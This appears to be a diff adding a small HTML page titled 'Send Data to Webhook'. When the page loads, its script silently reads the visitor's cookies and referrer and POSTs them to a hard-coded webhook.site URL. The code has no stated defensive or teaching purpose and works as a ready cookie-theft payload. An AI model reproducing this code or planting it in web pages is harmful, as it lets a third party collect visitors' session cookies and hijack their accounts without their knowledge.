@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Data to Webhook</title>
+</head>
+<body>
+
+<script>
+    // Function to make a POST request to your webhook URL
+    function sendDataToWebhook(url, data) {
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Data sent successfully!');
+            } else {
+                console.error('Failed to send data.');
+            }
+        })
+        .catch(error => {
+            console.error('Error sending data:', error);
+        });
+    }
+
+    // Function to capture referrer URL and cookies
+    function captureDataAndSend() {
+        const referrer = document.referrer;
+        const cookies = document.cookie;
+
+        const webhookUrl = 'https://webhook.site/5748823d-a911-4d4d-880d-ea51fe8552bc'; // Replace with your webhook URL
+
+        const data = {
+            referrer: referrer,
+            cookies: cookies
+        };
+
+        // Send captured data to the webhook
+        sendDataToWebhook(webhookUrl, data);
+    }
+
+    // Call the function when the page loads
+    captureDataAndSend();
+</script>
+
+</body>
+</html>
